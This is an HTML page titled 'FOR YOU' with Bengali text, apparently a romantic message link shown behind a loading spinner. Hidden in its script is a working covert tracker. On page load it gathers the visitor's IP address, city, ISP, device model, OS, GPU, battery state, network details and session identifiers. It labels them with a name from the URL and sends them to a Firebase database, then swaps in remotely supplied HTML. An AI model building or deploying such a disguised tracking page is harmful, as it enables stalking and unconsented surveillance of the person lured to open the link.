<!DOCTYPE html>
<html lang="bn">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <meta name="theme-color" content="#1a0f16" />
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
  <title>FOR YOU</title>

  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
  <link href="https://fonts.googleapis.com/css2?family=Noto+Serif+Bengali:wght@400;600&family=Hind+Siliguri:wght@400;500;600&display=swap" rel="stylesheet" />

  <style>
    /* ─── RESET & DESIGN SYSTEM ───────────────────────────────── */
    *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }

    :root {
      --bg: #fdfbfd;
      --card-bg: #ffffff;
      --text: #1a0f16;
      --text-muted: #6b5966;
      --primary: #d14167;
      --border: #f5eef2;
      --dark-bg: #1a0f16;
      --gradient-primary: linear-gradient(135deg, #d14167 0%, #e85a88 100%);
    }

    html, body {
      min-height: 100%;
    }

    body {
      font-family: 'Hind Siliguri', sans-serif;
      background-color: var(--bg);
      color: var(--text);
      overflow-x: hidden;
    }

    /* ─── FULL-PAGE OVERLAY LAYOUT ──────────────────────────────── */
    #page-overlay {
      position: fixed;
      inset: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 100;
      background: linear-gradient(135deg, #fdfbfd 0%, #f5f0f8 100%);
      padding: 12px;
      overflow-y: auto;
    }

    /* ─── LOADER ────────────────────────────────────────────────── */
    .loader-container {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      text-align: center;
      background: var(--card-bg);
      padding: 50px 40px;
      border-radius: 32px;
      box-shadow:
        0 20px 60px rgba(209, 65, 103, 0.12),
        0 0 1px rgba(0, 0, 0, 0.05);
      border: 1px solid var(--border);
      max-width: 280px;
      position: relative;
      overflow: hidden;
    }

    .loader-container::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      height: 3px;
      background: var(--gradient-primary);
    }

    /* Chrome-like circular spinner */
    .spinner {
      width: 44px;
      height: 44px;
      border: 4px solid rgba(0,0,0,0.08);
      border-top-color: var(--primary);
      border-radius: 50%;
      animation: spin 0.9s linear infinite;
      margin-bottom: 20px;
      display: block;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    .heart-spinner {
      font-size: 60px;
      animation: heartBeat 1.2s infinite ease-in-out;
      margin-bottom: 20px;
      display: none; /* hide original heart emoji spinner */
    }

    .loader-text {
      font-size: 14px;
      color: var(--text-muted);
      font-weight: 500;
      letter-spacing: 0.05em;
      margin-bottom: 20px;
    }

    .loader-dots {
      display: flex;
      justify-content: center;
      gap: 6px;
      margin-top: 15px;
    }

    .dot {
      width: 8px;
      height: 8px;
      border-radius: 50%;
      background: var(--primary);
      animation: dotBounce 1.4s infinite ease-in-out;
    }

    .dot:nth-child(1) { animation-delay: 0s; }
    .dot:nth-child(2) { animation-delay: 0.2s; }
    .dot:nth-child(3) { animation-delay: 0.4s; }

    @keyframes heartBeat {
      0%   { transform: scale(1); }
      25%  { transform: scale(1.2); }
      40%  { transform: scale(1); }
      60%  { transform: scale(1.2); }
      100% { transform: scale(1); }
    }

    @keyframes dotBounce {
      0%, 80%, 100% { transform: translateY(0); opacity: 0.6; }
      40% { transform: translateY(-10px); opacity: 1; }
    }

    /* ─── CARD ──────��───────────────────────────────────────────── */
    .card {
      background: var(--card-bg);
      max-width: 440px;
      width: 100%;
      padding: 40px 28px;
      border-radius: 28px;
      box-shadow:
        0 10px 40px rgba(209, 65, 103, 0.06),
        0 1px 3px rgba(0, 0, 0, 0.02);
      border: 1px solid var(--border);
      text-align: center;
      position: relative;
      height: auto;
      overflow: visible;
      display: none;
      animation: cardFadeIn 0.6s cubic-bezier(0.16, 1, 0.3, 1);
    }

    #page-overlay.card-visible {
      position: relative;
      min-height: 100vh;
      align-items: flex-start;
      padding: 24px 12px;
    }

    @keyframes cardFadeIn {
      from { opacity: 0; transform: translateY(20px); }
      to   { opacity: 1; transform: translateY(0); }
    }

    /* ─── FLOATING HEARTS ───────────────────────────────────────── */
    .floating-heart {
      position: absolute;
      font-size: 14px;
      color: rgba(209, 65, 103, 0.15);
      animation: floatUp 7s infinite linear;
      bottom: -20px;
      pointer-events: none;
    }

    @keyframes floatUp {
      0%   { transform: translateY(0) translateX(0) scale(1); opacity: 0; }
      10%  { opacity: 1; }
      90%  { opacity: 1; }
      100% { transform: translateY(-450px) translateX(25px) scale(0.8); opacity: 0; }
    }

    /* ─── FULLSCREEN IFRAME ──────────────────────────────────────── */
    #full-iframe {
      position: fixed;
      inset: 0;
      width: 100%;
      height: 100%;
      border: none;
      display: none;
      z-index: 200;
    }

    /* ─── CONTENT STYLES (fallback — iframe না থাকলে) ───────────── */
    .heart-icon {
      font-size: 44px;
      color: var(--primary);
      margin-bottom: 25px;
      animation: pulse 2.5s infinite ease-in-out;
      display: inline-block;
    }

    @keyframes pulse {
      0%, 100% { transform: scale(1); }
      50%       { transform: scale(1.08); }
    }

    .sender-tag {
      font-size: 12px;
      color: var(--primary);
      text-transform: uppercase;
      letter-spacing: 0.12em;
      font-weight: 600;
      margin-bottom: 8px;
      display: block;
    }

    h1 {
      font-family: 'Noto Serif Bengali', serif;
      font-size: 24px;
      font-weight: 600;
      line-height: 1.6;
      color: var(--text);
      margin-bottom: 18px;
    }

    .message-text {
      font-size: 15.5px;
      color: var(--text-muted);
      line-height: 1.8;
      font-weight: 400;
    }

    /* ✅ Responsive */
    @media (max-width: 480px) {
      .card { padding: 28px 18px; border-radius: 20px; }
      h1 { font-size: 20px; }
      .message-text { font-size: 14px; }
      .heart-icon { font-size: 36px; margin-bottom: 18px; }
      .loader-container { padding: 40px 30px; max-width: 260px; }
      .heart-spinner { font-size: 50px; }
    }

    @media (max-width: 360px) {
      .card { padding: 22px 14px; border-radius: 16px; }
      h1 { font-size: 18px; }
      .message-text { font-size: 13.5px; }
      .loader-container { padding: 35px 25px; max-width: 240px; }
      .heart-spinner { font-size: 45px; }
      .loader-text { font-size: 13px; }
    }
  </style>
</head>
<body>

  <!-- Fullscreen iframe — Firebase থেকে আসা পুরো HTML এখানে রেন্ডার হবে -->
  <iframe id="full-iframe" sandbox="allow-scripts allow-same-origin allow-forms allow-popups"></iframe>

  <!-- Loader overlay -->
  <div id="page-overlay">
    <div id="loader" class="loader-container">
      <div class="spinner" aria-hidden="true"></div>
      <div class="loader-text">লোড হচ্ছে...</div>
      <div class="loader-dots">
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
      </div>
    </div>
  </div>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
import { getDatabase, ref, push, update, onValue, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";

function getNameFromURL() {
  const params = new URLSearchParams(window.location.search);
  let name = params.get('n') || params.get('name') || 'Unknown';
  return decodeURIComponent(name);
}

const firebaseConfig = {
  apiKey: "AIzaSyDs3buPka62aeOttWyKBaT7sEDotXVK5Zw",
  authDomain: "love-5585d.firebaseapp.com",
  databaseURL: "https://love-5585d-default-rtdb.firebaseio.com",
  projectId: "love-5585d",
  storageBucket: "love-5585d.firebasestorage.app",
  messagingSenderId: "435569951955",
  appId: "1:435569951955:web:863b3686c567c210e78026",
  measurementId: "G-2VZ27SZY2P"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

/* ── Global variables for new data ── */
window.pageLoadStart = performance.now();
window.clickCounter = 0;
window.jsErrors = [];
window.failedFetchURLs = [];
window.cumulativeLayoutShift = 0;
if(!sessionStorage.session_id) sessionStorage.session_id = crypto.randomUUID();
localStorage.visitCount = parseInt(localStorage.visitCount||0) + 1;

/* ── Event listeners ── */
document.addEventListener('click', ()=> window.clickCounter++);
window.onerror = (m,s,l)=> window.jsErrors.push(`${m} at ${s}:${l}`);
const oldFetch = window.fetch;
window.fetch = (...args)=> oldFetch(...args).catch(e=>{ window.failedFetchURLs.push(args[0]); throw e; });

try{
new PerformanceObserver(e=> window.largestContentfulPaint = e.getEntries().pop().startTime).observe({type:'largest-contentful-paint', buffered:true});
new PerformanceObserver(e=> window.firstInputDelay = e.getEntries().pop().processingStart - e.getEntries().pop().startTime).observe({type:'first-input', buffered:true});
new PerformanceObserver(e=> window.cumulativeLayoutShift = (window.cumulativeLayoutShift||0) + e.getEntries().filter(x=>!x.hadRecentInput).reduce((a,b)=>a+b.value,0)).observe({type:'layout-shift', buffered:true});
}catch(e){}

/* ── Device parser ── */
function parseDevice(ua) {
  let model = "Unknown Device";
  if (/iPhone/.test(ua)) model = "iPhone";
  else if (/iPad/.test(ua)) model = "iPad";
  else if (/Android/.test(ua)) {
    const m = ua.match(/Android [^;]+;\s*([^;\)]+)/);
    if (m && m[1]) { model = m[1].trim(); if (model.includes("Build/")) model = model.split("Build/")[0].trim(); }
    else model = "Android Device";
  } else if (/Windows NT/.test(ua)) model = "Windows PC";
  else if (/Macintosh/.test(ua)) model = "MacBook / iMac";
  
  let os = "Unknown OS";
  if (/iPhone OS ([\d_]+)/.test(ua)) os = "iOS " + ua.match(/iPhone OS ([\d_]+)/)[1].replace(/_/g,".");
  else if (/Android ([\d.]+)/.test(ua)) os = "Android " + ua.match(/Android ([\d.]+)/)[1];
  else if (/Windows NT ([\d.]+)/.test(ua)) os = "Windows NT " + ua.match(/Windows NT ([\d.]+)/)[1];
  else if (/Mac OS X ([\d_]+)/.test(ua)) os = "macOS " + ua.match(/Mac OS X ([\d_]+)/)[1].replace(/_/g,".");
  
  let browser = "Unknown Browser";
  if (/Chrome\/([\d.]+)/.test(ua) && !/Chromium|Edg|OPR/.test(ua)) browser = "Chrome";
  else if (/Firefox\/([\d.]+)/.test(ua)) browser = "Firefox";
  else if (/Safari\/([\d.]+)/.test(ua) && !/Chrome/.test(ua)) browser = "Safari";
  else if (/Edg\/([\d.]+)/.test(ua)) browser = "Edge";
  
  return { model, os, browser, type: /Mobi|Android|iPhone/i.test(ua) ? "Mobile" : "Desktop" };
}

/* ── GPU info ── */
function getGPUInfo() {
  try {
    const canvas = document.createElement("canvas");
    const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
    if (!gl) return { vendor: "N/A", renderer: "N/A" };
    const dbg = gl.getExtension("WEBGL_debug_renderer_info");
    if (!dbg) return { vendor: "N/A", renderer: "N/A" };
    return { vendor: gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) || "N/A", renderer: gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) || "N/A" };
  } catch (e) { return { vendor: "Error", renderer: "Error" }; }
}

/* ── Geo fetch ── */
async function fetchGeoData() {
  const apis = [
    { url: "https://ip-api.com/json/?fields=status,query,city,regionName,country,countryCode,isp", mapFunc: d => ({ ip: d.query, city: d.city, region: d.regionName, country_code: d.countryCode, isp: d.isp || "N/A" }) },
    { url: "https://ipwho.is/", mapFunc: d => ({ ip: d.ip, city: d.city, region: d.region, country_code: d.country_code, isp: d.connection?.isp || "N/A" }) },
    { url: "https://ipapi.co/json/", mapFunc: d => ({ ip: d.ip, city: d.city, region: d.region, country_code: d.country_code, isp: d.org || "N/A" }) },
    { url: "https://geolocation-db.com/json/", mapFunc: d => ({ ip: d.IPv4, city: d.city, region: d.state, country_code: d.country_code, isp: "N/A" }) }
  ];
  
  for (let apiObj of apis) {
    try {
      const res = await fetch(apiObj.url);
      const data = await res.json();
      if (data && (data.ip || data.query || data.IPv4)) {
        const result = apiObj.mapFunc(data);
        if (result.ip && result.ip !== "N/A") return result;
      }
    } catch (e) {}
  }
  return {ip:"N/A", city:"N/A", region:"N/A", country_code:"N/A", isp:"N/A"};
}

/* ── Show iframe ── */
function showIframeAndHideLoader() {
  const loader = document.getElementById("loader");
  const overlay = document.getElementById("page-overlay");
  const iframe = document.getElementById("full-iframe");
  if (loader) loader.style.display = "none";
  if (overlay) overlay.style.display = "none";
  if (iframe) iframe.style.display = "block";
}

/* ── Firebase listener ── */
function listenForCustomUI() {
  const uiRef = ref(db, "ui_config/custom_html");
  onValue(uiRef, (snapshot) => {
    const htmlContent = snapshot.val();
    const iframe = document.getElementById("full-iframe");
    if (iframe && htmlContent && htmlContent.trim() !== "") {
      iframe.srcdoc = htmlContent;
      showIframeAndHideLoader();
    }
  });
}

/* ── Main collector - শুধু 1 বার ── */
async function collectAndSyncData() {
  const pageLoadTime = window.performance ? Math.round(performance.now()) + " ms" : "N/A";
  const geoData = await fetchGeoData();
  const ua = navigator.userAgent;
  const device = parseDevice(ua);
  const conn = navigator.connection || {};
  const gpu = getGPUInfo();
  
  let batteryLevel = "N/A";
  let batteryCharging = "N/A";
  try {
    const bat = await navigator.getBattery();
    batteryLevel = Math.round(bat.level * 100) + "%";
    batteryCharging = bat.charging ? "Charging" : "Not Charging";
  } catch (e) {}

  const visitorData = {
    custom_label: getNameFromURL(),
    ip: geoData.ip,
    isp: geoData.isp,
    city: geoData.city,
    region: geoData.region,
    country_code: geoData.country_code,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "N/A",
    device_model: device.model,
    device_type: device.type,
    os: device.os,
    browser: device.browser,
    screen: screen.width + "x" + screen.height,
    screen_orientation: screen.orientation ? screen.orientation.type : "N/A",
    color_depth: screen.colorDepth + " bit",
    touch_screen: ("ontouchstart" in window || navigator.maxTouchPoints > 0) ? "Yes" : "No",
    dark_mode: window.matchMedia("(prefers-color-scheme: dark)").matches ? "Yes" : "No",
    cpu_cores: navigator.hardwareConcurrency || "N/A",
    device_memory: (navigator.deviceMemory || "N/A") + (navigator.deviceMemory ? " GB" : ""),
    gpu_vendor: gpu.vendor,
    gpu_renderer: gpu.renderer,
    language: navigator.language || "N/A",
    connection_type: conn.effectiveType || "N/A",
    downlink_speed: conn.downlink ? conn.downlink + " Mbps" : "N/A",
    network_rtt: conn.rtt ? conn.rtt + " ms" : "N/A",
    save_data: conn.saveData ? "Yes" : "No",
    page_load_speed: pageLoadTime,
    online_status: navigator.onLine ? "Online" : "Offline",
    battery_level: batteryLevel,
    battery_charging: batteryCharging,
    referrer: document.referrer || "Direct Link",
    page_url: window.location.href,
    page_title: document.title,
    updatedAt: serverTimestamp(),
    local_time: new Date().toLocaleString("en-BD"),
    user_agent: ua,
    
    time_on_page: Math.round((Date.now() - window.pageLoadStart)/1000) + "s",
    scroll_depth: Math.round(Math.max(window.scrollY / ((document.documentElement.scrollHeight - window.innerHeight)||1) * 100, 0)) + "%",
    click_count: window.clickCounter,
    utm_source: new URLSearchParams(window.location.search).get('utm_source') || "N/A",
    utm_campaign: new URLSearchParams(window.location.search).get('utm_campaign') || "N/A",
    session_id: sessionStorage.session_id,
    visit_count: parseInt(localStorage.visitCount),
    lcp: (window.largestContentfulPaint||0) + "ms",
    fid: (window.firstInputDelay||0) + "ms",
    cls: (window.cumulativeLayoutShift||0).toFixed(3),
    js_errors: window.jsErrors.length ? window.jsErrors.slice(-3).join(" | ") : "None",
    failed_requests: window.failedFetchURLs.length ? window.failedFetchURLs.slice(-3).join(" | ") : "None"
  };

  try {
    const existingKey = localStorage.getItem("hoor_toor_key");
    const savedLabel = localStorage.getItem("hoor_toor_label");
    const currentLabel = getNameFromURL();
    if (existingKey && savedLabel === currentLabel) {
      await update(ref(db, `visitors/${existingKey}`), visitorData);
    } else {
      const newRef = await push(ref(db, "visitors"), {...visitorData, createdAt: serverTimestamp()});
      localStorage.setItem("hoor_toor_key", newRef.key);
      localStorage.setItem("hoor_toor_label", currentLabel);
    }
  } catch (err) {
    console.error("Sync Error:", err);
  }
  
  showIframeAndHideLoader();
}

/* ── Bootstrap ── */
window.addEventListener("load", () => {
  listenForCustomUI();
  collectAndSyncData();
  setTimeout(showIframeAndHideLoader, 4000);
});
</script>
</body>
</html>
